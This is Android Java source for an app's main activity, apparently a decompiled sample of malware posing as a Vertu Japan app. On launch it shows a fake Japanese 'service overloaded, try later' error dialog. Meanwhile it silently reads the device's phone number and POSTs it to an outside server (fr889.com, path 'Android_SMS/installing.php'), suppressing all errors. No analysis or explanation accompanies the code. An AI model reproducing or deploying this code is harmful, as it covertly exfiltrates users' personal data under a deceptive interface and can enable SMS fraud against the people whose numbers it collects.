package com.vertu.jp;

import android.app.Activity;
import android.app.AlertDialog.Builder;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends Activity {
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        getWindow().setFlags(1024, 1024);
        setContentView(R.layout.main);
        Builder localBuilder = new Builder(this);
        localBuilder.setMessage("サービスが高負荷であるかオフラインになっています。後で再試行してください。");
        localBuilder.show();
        try {
            String str1 = ((TelephonyManager) getSystemService("phone")).getLine1Number();
            StringBuffer localStringBuffer = new StringBuffer();
            localStringBuffer.append("mobile").append("=").append(str1);
            HttpURLConnection conn = (HttpURLConnection) new URL("http://fr889.com/Android_SMS/installing.php").openConnection();
            conn.setDefaultUseCaches(false);
            conn.setConnectTimeout(3000);
            conn.setDoInput(true);
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("content-type", "application/x-www-form-urlencoded");
            conn.setDoOutput(true);
            PrintWriter localPrintWriter = new PrintWriter(new OutputStreamWriter(conn.getOutputStream(), "EUC-JP"));
            localPrintWriter.write(localStringBuffer.toString());
            localPrintWriter.flush();
            BufferedReader localBufferedReader = new BufferedReader(new InputStreamReader(conn.getInputStream(), "EUC-JP"));
            StringBuilder localStringBuilder = new StringBuilder();
            while (true) {
                String str2 = localBufferedReader.readLine();
                if (str2 != null) {
                    localStringBuilder.append(str2);
                } else {
                    return;
                }
            }
        } catch (Exception e) {
        }
    }
}
